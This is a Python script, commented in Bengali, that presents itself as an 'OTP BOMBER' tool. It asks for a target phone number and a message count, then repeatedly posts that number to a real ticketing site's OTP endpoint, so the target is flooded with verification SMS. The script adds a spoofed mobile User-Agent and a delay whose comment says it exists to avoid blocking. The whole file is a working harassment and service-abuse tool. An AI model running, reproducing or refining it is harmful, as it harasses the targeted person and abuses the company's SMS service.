import requests, os, time, uuid

def start():
    os.system('clear')
    
    # স্ক্রিনশটের মতো বড় এবং রঙিন ASCII আর্ট ব্যানার (META)
    print('''\033[1;31m
    ███╗   ███╗███████╗████████╗ █████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗
    ██╔████╔██║█████╗     ██║   ███████║
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║
    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\033[0m''')

    # আপনার দেওয়া তথ্য অনুযায়ী নিখুঁত বক্স লেআউট
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY : MD MALEK ISLAM         |')
    print('| [✓] GITHUB       : MR-MALAK               |')
    print('| [✓] TELEGRAM     : md_malek               |')
    print('| [✓] TOOL STATUS  : OTP BOMBER (META)      |')
    print('| [✓] TOOL VERSION : MAX PRO 2026           |\033[0m')
    print(line)

    # কি (Key) জেনারেটর স্টাইল
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[▼] KEY : {u_key}-MR-MALAK\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))

    # ১০০% সচল এপিআই হেডার
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36"
    }

    print(f'\n\033[1;32m[✓] ATTACK STARTED ==> {target}\033[0m\n')

    for i in range(1, amount + 1):
        try:
            # আপডেট এপিআই (Bdtickets + Shikho)
            requests.post("https://api.bdtickets.com/api/v1/otp/send", json={"mobileNumber": target}, headers=headers, timeout=10)
            print(f'\033[1;32m[{i}] META SUCCESS ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] META FAILED\033[0m')

        # ব্লকিং এড়াতে ৩ সেকেন্ড গ্যাপ
        time.sleep(3)

if __name__ == "__main__":
    start()
